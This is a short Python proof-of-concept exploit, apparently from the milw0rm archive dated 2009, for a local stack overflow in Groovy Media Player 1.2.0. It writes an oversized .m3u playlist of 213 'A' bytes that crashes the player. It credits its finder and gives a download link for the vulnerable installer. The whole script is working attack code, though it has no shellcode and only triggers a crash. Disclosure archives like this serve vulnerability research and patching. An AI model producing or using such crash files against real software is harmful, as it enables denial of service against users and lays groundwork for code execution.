#!/usr/bin/python
print "Groovy Media Player 1.2.0 (.m3u) local stack overlow POC"
print " finded by : opt!x hacker <optix@9.cn> "
print "download: http://www.bestwebsharing.com/downloads/groovy-media-player-setup.exe "
junk = "\x41"*213
file=open("crash.m3u","w")
file.write(junk)
file.close()
 
# milw0rm.com [2009-08-06]
